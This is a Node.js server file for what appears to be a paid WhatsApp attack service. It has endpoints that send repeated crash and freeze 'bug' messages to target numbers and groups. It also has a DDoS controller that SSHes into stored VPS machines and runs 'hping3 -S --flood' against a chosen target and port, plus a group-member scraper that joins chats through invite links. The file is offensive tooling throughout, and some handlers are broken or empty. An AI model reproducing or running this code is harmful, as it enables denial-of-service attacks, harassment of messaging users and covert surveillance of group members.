const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@devil-fight/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
// BUG UNTUK PRIVATE CHAT
const bugs = [
  { bug_id: "freez", bug_name: "Freez Clik Crash" },
  { bug_id: "bulldo", bug_name: "Buldo Hard" },
  { bug_id: "invisible", bug_name: "Delay Invisible" },
  { bug_id: "ioscrash", bug_name: "Crash Iphone" },
  { bug_id: "blank", bug_name: "Blank Ui System" },
  { bug_id: "forclose", bug_name: "Contact FC Anti Block" },
];

const privateBugs = [
  { bug_id: "freez", bug_name: "Freez Clik Crash (gk work)" },
  { bug_id: "bulldo", bug_name: "Buldo Hard" },
  { bug_id: "invisible", bug_name: "Delay Invisible" },
  { bug_id: "ioscrash", bug_name: "Crash Ios (gk worl)" },
  { bug_id: "blank", bug_name: "Blank Ui System" },
  { bug_id: "forclose", bug_name: "Contact FC Anti Block" },
];

// BUG UNTUK GROUP
const groupBugs = [
  { bug_id: "group_freez", bug_name: "Group Frez Chat (gk work)" },
  { bug_id: "group_invisible", bug_name: "Delay Group" },
  { bug_id: "group_blank", bug_name: "Blank Group" },
  { bug_id: "group_forclose", bug_name: "Group Forclose Hard" },
];

let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));

// Initialize these variables properly at the beginning
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// Fix: Proper file watcher initialization
let keyListWatcher = null;

function watchKeyList() {
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  
  keyListWatcher = fs.watchFile("keyList.json", () => {
    console.log("[📂] keyList.json changed, reloading...");
    try {
      sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
    } catch (err) {
      console.error("Error reloading keyList.json:", err.message);
    }
  });
}

// Initialize watcher
watchKeyList();

// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  try {
    chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
  } catch (err) {
    console.error("Error loading chat file:", err.message);
    chatList = [];
  }
}

// Simpan chat
function saveChat() {
  try {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
  } catch (err) {
    console.error("Error saving chat file:", err.message);
  }
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
server.listen(3000, () => {
  console.log(`🟣 Server running on http://localhost:3000`);
});

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 10 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const vinzzoffc = new Client();

    vinzzoffc.on('ready', () => {
      if (!cncActive) {
        vinzzoffc.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = vinzzoffc;

      // Jika koneksi putus, reconnect otomatis
      vinzzoffc.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    vinzzoffc.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    vinzzoffc.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (err) {
    console.error("Error loading VPS file:", err.message);
  }
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key, androidId) {

  const session = validateSession(key, androidId);
  if (!session) return null;
  return session.username;

}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const vinzzoffc = vpsConnections[vps.host];
    if (!vinzzoffc) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    vinzzoffc.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

const cooldowns = {};

// ===== ENDPOINT AUTO REGISTER DARI APP =====
app.post("/autoRegister", (req, res) => {
  const { androidId } = req.body;

  if (!androidId) {
    return res.json({ 
      success: false, 
      message: "androidId diperlukan" 
    });
  }

  try {
    const db = loadDatabase();

    // Generate random username (5 huruf)
    const username = Array.from({ length: 5 }, () => 
      String.fromCharCode(97 + Math.floor(Math.random() * 26))
    ).join('').toUpperCase();

    // Generate random password (5 angka)
    const password = Array.from({ length: 5 }, () => 
      Math.floor(Math.random() * 10)
    ).join('');

    // Cek jika username sudah ada (retry jika perlu)
    if (db.find(u => u.username === username)) {
      return res.json({ 
        success: false, 
        message: "Username conflict, coba lagi" 
      });
    }

    // Set expired date (30 jam dari sekarang)
    const expiredDate = new Date();
    expiredDate.setHours(expiredDate.getHours() + 30);

    // Buat akun baru
    const newUser = {
      username,
      password,
      role: "member",
      expiredDate: expiredDate.toISOString().split("T")[0],
      androidId
    };

    db.push(newUser);
    saveDatabase(db);

    // Log
    const logLine = `${new Date().toISOString()} | AUTO_REGISTER | ${username} created from app (Android: ${androidId})\n`;
    fs.appendFileSync('logUser.txt', logLine);

    console.log(`[✅ AUTO REGISTER] ${username} created`);

    // Kirim notifikasi ke grup Telegram

    return res.json({
      success: true,
      username,
      password,
      role: "member",
      expiredDate: newUser.expiredDate,
      message: "Akun berhasil dibuat!"
    });

  } catch (err) {
    console.error("[❌ AUTO REGISTER ERROR]", err.message);
    return res.json({ 
      success: false, 
      message: "Terjadi kesalahan server" 
    });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const vinzzoffc = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await vinzzoffc.groupAcceptInvite(code);
    const metadata = await vinzzoffc.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await vinzzoffc.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const vinzzoffc = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await vinzzoffc.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await vinzzoffc.fetchStatus(jid).catch(() => null);
    const check = await vinzzoffc.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

const SESSION_DURATION = 10 * 60 * 1000; // 10 menit

function loadKeyList() {
  try {
    if (!fs.existsSync(KEY_FILE)) return [];
    return JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
  } catch {
    return [];
  }
}

function saveKeyList(data) {
  fs.writeFileSync(KEY_FILE, JSON.stringify(data, null, 2));
}

function generateSessionKey() {
  return crypto.randomBytes(16).toString("hex");
}

function createSession(username, androidId, deviceName, ip) {
  const list = loadKeyList();

  const filtered = list.filter(x => x.username !== username);

  const key = generateSessionKey();

  const session = {
    username,
    sessionKey: key,
    androidId,
    deviceName,
    ipAddress: ip,
    lastLogin: new Date().toISOString(),
    expires: Date.now() + SESSION_DURATION
  };

  filtered.push(session);

  saveKeyList(filtered);

  activeKeys[key] = {
    username,
    expires: session.expires
  };

  return key;
}

function validateSession(key, androidId) {
  const list = loadKeyList();
  const session = list.find(x => x.sessionKey === key);

  if (!session) return null;

  if (session.androidId !== androidId) return null;

  if (Date.now() > session.expires) {
    const filtered = list.filter(x => x.sessionKey !== key);
    saveKeyList(filtered);
    delete activeKeys[key];
    return null;
  }

  return session;
}

function recordKey({ username, key, role, ip, androidId, deviceName }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  const newRecord = {
    username,
    lastLogin: stamp,
    sessionKey: key,
    ipAddress: ip,
    androidId,
    deviceName: deviceName || "Unknown Device" // Tambahkan device name
  };

  if (idx !== -1) {
    list[idx] = newRecord;
  } else {
    list.push(newRecord);
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/2wukuu.jpg",
    title: "New Release",
    desc: "Check Feature Update"
  }
];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    owner: 0,
    mods: 10,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const attemptSend = async (vinzzoffc, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
     switch (bug) {
        case "freez":
            for (let i = 0; i < 180; i++) {
                  
            }
          break;
        case "bulldo":
            for (let i = 0; i < 150; i++) {
                  await Striping(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, targetJid);
            }
          break;
        case "invisible":
            for (let i = 0; i < 150; i++) {
                  await SakataCrashDelay(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, targetJid);
            }
          break;
        case "ioscrash":
            for (let i = 0; i < 150; i++) {
                   
            }
          break;
        case "blank":
            for (let i = 0; i < 150; i++) {
                  await blankcuy(vinzzoffc, targetJid);
                  await Nukleotix(vinzzoffc, targetJid);
                  await CrashUi(vinzzoffc, targetJid);
                  await blankCok(vinzzoffc, targetJid);
            }
          break;
        case "forclose":
            for (let i = 0; i < 100; i++) {
                  await X7Dev(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, targetJid);
                  await X7Dev(vinzzoffc, targetJid);
            }
          break;
      }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        const sessionName = user.username;
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    const vinzzoffc = await checkActiveSessionInFolder(user.username);
    if (!vinzzoffc) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(vinzzoffc);
  });
});

// ===== ENDPOINT BUG GROUP =====
app.get("/sendGroupBug", async (req, res) => {
  const { key, link, bug } = req.query;
  
  console.log(`[📤 GROUP BUG] Request to attack group with key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ GROUP BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ GROUP BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== VALIDASI LINK GROUP =====
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) {
    return res.json({ 
      valid: true, 
      sended: false, 
      message: "Link grup tidak valid" 
    });
  }

  const code = match[1];

  // ===== COOLDOWN CHECK =====
  const roleCooldowns = {
    member: 600,
    reseller: 350,
    owner: 120,
    mods: 10000,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ===== UPDATE LAST SEND =====
  user.lastSend = now;
  saveDatabase(db);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    try {
      const bizKeys = Object.keys(biz);
      if (bizKeys.length === 0) {
        console.log("[❌ NO SOCKET] Tidak ada Business socket tersedia.");
        return;
      }

      const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
      const vinzzoffc = biz[socketId];

      console.log(`[🎯 GROUP BUG] Using socket: ${socketId}`);

      const groupJid = await vinzzoffc.groupAcceptInvite(code);
      console.log(`[✅ JOINED] Berhasil join grup: ${groupJid}`);

      await sleep(2000);

      // Kirim bug sesuai tipe
      switch (bug) {
        case "group_freez":
            for (let i = 0; i < 180; i++) {
                  
            }
          break
        case "group_invisible":
            for (let i = 0; i < 150; i++) {
                  await SakataCrashDelay(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, targetJid);
            }
          break;
        case "group_blank":
            for (let i = 0; i < 100; i++) {
                  await blankCok(vinzzoffc, targetJid);
                  await CrashUi(vinzzoffc, targetJid);
                  await Nukleotix(vinzzoffc, targetJid);
                  await blankcuy(vinzzoffc, targetJid);
            }
          break;
        case "group_forclose":
            for (let i = 0; i < 150; i++) {
                  await X7Dev(vinzzoffc, targetJid);
                  await SakataCrashDelay(vinzzoffc, target);
                  await X7Dev(vinzzoffc, target);
            }
          break;
      }

      console.log(`[✅ GROUP BUG] Bug '${bug}' terkirim ke grup`);

      // Leave grup setelah attack
      await sleep(2000);
      await vinzzoffc.groupLeave(groupJid);
      console.log(`[👋 LEFT] Keluar dari grup: ${groupJid}`);

    } catch (err) {
      console.warn(`[⚠️ GROUP BUG ERROR] ${err.message}`);
    }
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('xs-sessi', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    
    // Cek apakah session ini aktif
    const isActive = activeConnections[sessionName] ? true : false;
    
    activeCreds.push({
      sessionName: sessionName,
      isActive: isActive,
      type: biz[sessionName] ? "Business" : mess[sessionName] ? "Messenger" : "Unknown"
    });
  }

  return activeCreds;
}

// ===== GET PUBLIC SENDERS =====
app.get("/getPublicSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  const folder = path.join("xs-sessi", "SenderPublic");

  if (!fs.existsSync(folder)) {
    fs.mkdirSync(folder, { recursive: true });
  }

  const files = fs.readdirSync(folder).filter(f => f.endsWith(".json"));

  const senders = files.map(file => {
    const sessionName = path.basename(file, ".json");

    return {
      sessionName,
      isActive: activeConnections[sessionName] ? true : false,
      type: biz[sessionName]
        ? "Business"
        : mess[sessionName]
        ? "Messenger"
        : "Unknown"
    };
  });

  return res.json({
    valid: true,
    senders
  });
});

